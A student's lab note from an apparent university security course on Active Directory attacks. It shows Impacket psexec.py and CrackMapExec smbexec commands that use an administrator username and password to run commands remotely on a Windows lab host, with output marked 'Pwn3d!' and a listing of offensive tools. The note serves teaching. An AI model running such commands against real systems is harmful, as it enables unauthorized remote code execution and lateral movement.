---
title: NTUSTISC - AD Note - Lab(遠端執行(RDP)2)
tags: [NTUSTISC, AD, information security]

category: "Security Course｜NTUST ISC｜AD｜4. 遠端執行-讀檔"
date: 2024-01-31
---

# NTUSTISC - AD Note - Lab(遠端執行(RDP)2)
<!-- more -->
[TOC]

Lecture Video: [ 2022/05/11 AD 安全 2 ](https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d)

## Background
[NTUSTISC - AD Note - Lab(Password Spraying)](https://hackmd.io/@SBK6401/Byk16MV0n)
[滲透測試的利器 - Impacket](https://sectools.tw/impacket/): 
> python撰寫的內網滲透工具

## Lab

### ==遠端執行(RDP)2==
* Kali-Linux Tools
    * Impacket(Kali-Linux愛好者可使用的PsExec)
        ```bash
        # Set up & Install
        $ git clone https://github.com/fortra/impacket.git
        $ cd impacket
        $ conda activate py3.7 # Recommended to install it in conda
        $ pip3 install -r requirements.txt
        $ python3 setup.py install
        
        # Cheat-Sheet
        $ conda activate py3.7
        $ proxychains psexec.py <username>:<password>@<ip> whoami
        ```
    * CrackMapExec
        ```bash
        $ crackmapexec smb [IP] -u <username> -p <password --exec-method smbexec -x '<command>'
        ```
        exec-method支援以下方法:
            * mmcexec
            * smbexec
            * wmiexec
            * atexec

#### ==How to use Impacket==
感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具
```bash
$ proxychains psexec.py kuma\administrators:1qaz@WSX3edc@192.168.222.129 dir
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout
[-] [Errno Connection error (192.168.222.129:445)] [Errno 111] Connection refused
```

#### ==How to use CrackMapExec==
還記的之前的Lab([NTUSTISC - AD Note - Lab(Password Spraying)](https://hackmd.io/@SBK6401/Byk16MV0n))，有使用過這套工具，當時是為了做密碼揮灑的目的，不過考慮到psexec這個工具本質上就是爬到遠端的主機，然後開execve的process，並且跟他溝通，所以在這樣的前提下，就可以直接用CrackMapExec達到和psexec一樣的效果，畢竟兩者本質是做的事情差不多
:::spoiler Execution Result
```bash
$  crackmapexec smb 192.168.222.129 -u administrator -p 1qaz@WSX3edc --exec-method smbexec -x 'dir C:\tools'
SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\administrator:1qaz@WSX3edc (Pwn3d!)
SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] Executed command via smbexec
SMB         192.168.222.129 445    DESKTOP-G95U93T  ║╧║╨░╧ C ññ¬║║╧║╨¿Sª│╝╨┼╥íC
SMB         192.168.222.129 445    DESKTOP-G95U93T  ║╧║╨░╧º╟╕╣:  C230-62CE
SMB         192.168.222.129 445    DESKTOP-G95U93T  
SMB         192.168.222.129 445    DESKTOP-G95U93T  C:\tools ¬║Ñ╪┐²
SMB         192.168.222.129 445    DESKTOP-G95U93T  
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/17  ñUñ╚ 03:15    <DIR>          .
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/17  ñUñ╚ 03:15    <DIR>          ..
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/04  ñWñ╚ 12:57    <DIR>          AccessChk
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/06/22  ñUñ╚ 02:58         1,379,216 accesschk.exe
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/08/28  ñUñ╚ 11:41    <DIR>          BloodHound-master
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/08/27  ñWñ╚ 11:32    <DIR>          BloodHound-win32-x64
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/08/29  ñWñ╚ 01:24    <DIR>          BloodHound-win32-x64-4.1.0
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñWñ╚ 01:19           373,760 Certify.exe
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 02:39         1,137,664 DNSAdmin-DLL.dll
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/04  ñWñ╚ 10:02           443,650 Invoke-NinjaCopy.ps1
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 04:50    <DIR>          KDU-1.1.0
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/17  ñUñ╚ 12:08             1,590 Kerberos-AS-REP.txt
SMB         192.168.222.129 445    DESKTOP-G95U93T  2005/01/17  ñUñ╚ 05:23            22,528 KmdManager.exe
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 04:50    <DIR>          mimikatz_trunk
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/08/27  ñWñ╚ 11:31    <DIR>          neo4j-community-4.3.4
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 04:51    <DIR>          nopad
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/28  ñUñ╚ 11:09            27,136 PrintSpoofer64.exe
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/05  ñWñ╚ 11:51    <DIR>          Procdump
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 05:08    <DIR>          ProcessExplorer
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 05:08    <DIR>          PSTools
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñWñ╚ 12:27           301,056 Rubeus.exe
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/04  ñUñ╚ 11:33    <DIR>          Sysmon
SMB         192.168.222.129 445    DESKTOP-G95U93T  2021/09/29  ñUñ╚ 04:50    <DIR>          Windows-Kernel-Explorer-master
SMB         192.168.222.129 445    DESKTOP-G95U93T  2023/09/06  ñWñ╚ 11:12    <DIR>          Zip Folders
SMB         192.168.222.129 445    DESKTOP-G95U93T  8 ¡╙└╔«╫       3,686,600 ª∞ñ╕▓╒
SMB         192.168.222.129 445    DESKTOP-G95U93T  16 ¡╙Ñ╪┐²  16,192,659,456 ª∞ñ╕▓╒ÑiÑ╬
```
:::

## Reference
